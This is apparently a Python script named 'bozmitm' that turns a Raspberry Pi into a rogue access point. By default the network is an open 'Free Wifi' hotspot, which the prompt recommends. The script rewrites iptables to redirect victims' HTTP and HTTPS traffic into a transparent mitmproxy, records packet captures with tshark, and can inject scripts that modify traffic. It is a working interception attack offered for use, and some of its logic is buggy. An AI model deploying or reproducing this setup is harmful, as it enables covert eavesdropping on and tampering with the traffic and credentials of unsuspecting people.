import os
import time
import datetime
import useAlias

me = """
  _              
 | |             
 | |__   ___ ____
 | '_ \ / _ \_  /
 | |_) | (_) / / 
 |_.__/ \___/___|

                                                                                """
print(me)
now = datetime.datetime.now()

path = os.path.dirname(os.path.realpath(__file__))

try:
    print("[bozmitm] Please check README file.")

    useAlias_quest = input("[bozmitm] Make bozmitm a command? [Y/N]")
    useAlias_quest = useAlias_quest.lower()
    if useAlias_quest == "y" or useAlias_quest == "":
        useAlias.do()

    update_quest = input("[bozmitm] Install/update needed modules? [Y/N]")
    update_quest = update_quest.lower()
    if update_quest == "y" or update_quest == "":
        os.system("sudo apt-get install wireshark ")
        os.system("sudo apt-get install hostapd ")
        os.system("sudo apt-get install tshark")
        os.system("sudo apt-get install wondershaper ")
        # os.system("sudo apt-get install touch")
        os.system("sudo apt-get install python-pcapy ")
        os.system("sudo apt-get install python-pip ")
        os.system("sudo apt-get install python3-pip")
        os.system("sudo python3 -m pip install mitmproxy")
        os.system("sudo pip3 mitmproxy")
        os.system("sudo apt-get install aircrack-ng")

    ap_iface = input("Name of your wireless interface (for AP): ")  # wlan0
    net_iface = input("Name of your internet connected interface: ")  # wlan1

    ssid = input("Enter the SSID for the AP or leave blank for 'Free Wifi' : ")
    if (ssid == ""):
        ssid = "Free Wifi"
    ch = input("Enter the channel for the AP (default is 4) : ")
    if ch.isdigit() == False or ch > 12 or ch < 0:
        ch = 4

    while (True):
        pw = input(
            "Enter a valid password for AP (8 or more character needed) or press enter for no password (recommended): ")
        if (pw != ""):
            pw = "\nwpa=2\nwpa_passphrase=" + pw + "\nwpa_key_mgmt=WPA-PSK\nwpa_pairwise=TKIP\nrsn_pairwise=CCMP"
        break

    print("[Airmon-ng] Killing processes that interrupts...")
    os.system("sudo airmon-ng check kill ")

    hostapd_file = "interface=" + ap_iface + "\ndriver=nl80211\nssid=" + ssid + "\nhw_mode=g\nchannel=" + str(
        ch) + "\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0" + str(pw)
    print("[Hostapd] Deleting old config file...")
    os.system("sudo rm /etc/hostapd/hostapd.conf > /dev/null 2>&1")
    print("[Hostapd] Writing config file...")
    os.system("sudo echo -e '" + hostapd_file + "' > /etc/hostapd/hostapd.conf")

    print("[bozmitm] Configuring ip tables...")
    os.system("sudo ifconfig " + ap_iface + " up 10.0.0.1 netmask 255.255.255.0")
    os.system("sudo iptables --flush")
    os.system("sudo iptables --delete-chain")
    os.system("sudo iptables --table nat --flush")
    os.system("sudo iptables --table nat --delete-chain")
    os.system("sudo iptables --table nat --append POSTROUTING --out-interface " + net_iface + " -j MASQUERADE")
    os.system("sudo iptables --append FORWARD --in-interface " + ap_iface + " -j ACCEPT")

    pcap = input("[bozmitm] Capture pcap with Tshark? [Y/N]")
    pcap = pcap.lower()

    if (pcap == "y"):
        print("[tshark] Starting Tshark...")
        pcap_name = now.strftime("%Y-%m-%d")  # current year month and day
        os.system("sudo touch " + path + "/logs/" + pcap_name + ".pcap")
        os.system("sudo xterm -e tshark -i " + ap_iface + " -w " + path + "/logs/" + pcap_name + ".pcap &")
        time.sleep(1)

    print("Starting AP on " + ap_iface + "...")
    os.system("sudo xterm -e hostapd /etc/hostapd/hostapd.conf &")
    time.sleep(1)

    https_quest = input(
        "[mitmproxy] Capture HTTPS traffic with mitmproxy? (certificate needed, download it from mitm.it) [Y/N] ")
    https_quest = https_quest.lower()
    if (https_quest == "y"):
        os.system("sudo iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080")
    os.system("sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
    os.system("sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1")

    script_quest = input("[mitmproxy] Inject script to modify packets? If yes, enter directory otherwise press enter.")
    if (script_quest != ""):
        #if (script_quest[0] != "/"):
         #   script_quest = "/" + script_quest
        script_quest = "-s " + script_quest

    print("[bozmitm] You can find log files of mitmproxy and tshark under the %PATH%/bozmitm/logs directory. ")

    print("[bozmitm] Starting mitmproxy in 5 seconds...")
    time.sleep(1)  # 5
    mitm_logname = now.strftime("%Y-%m-%d")  # current year month and day
    os.system("sudo mitmproxy --mode transparent --showhost -w " + path + "/logs/" + mitm_logname + ".mitmproxy" + script_quest)

    print("[bozmitm] Stopping...")
    print("[bozmitm] Flushing ip tables...")
    os.system("sudo iptables --flush")
    os.system("sudo iptables --flush -t nat")
    os.system("sudo iptables --delete-chain")
    os.system("sudo iptables --table nat --delete-chain")
    print("[bozmitm] Reboot your pi to reset all configurations. ")
    print("[bozmitm] Stopped!")


except KeyboardInterrupt:
    print("")
    print("[bozmitm] Keyboard Interrupt. Stopping...")
    print("[bozmitm] Flushing ip tables...")
    os.system("sudo iptables --flush")
    os.system("sudo iptables --flush -t nat")
    os.system("sudo iptables --delete-chain")
    os.system("sudo iptables --table nat --delete-chain")
    print("[bozmitm] Reboot your pi to reset all configurations. ")
    print("[bozmitm] Stopped")

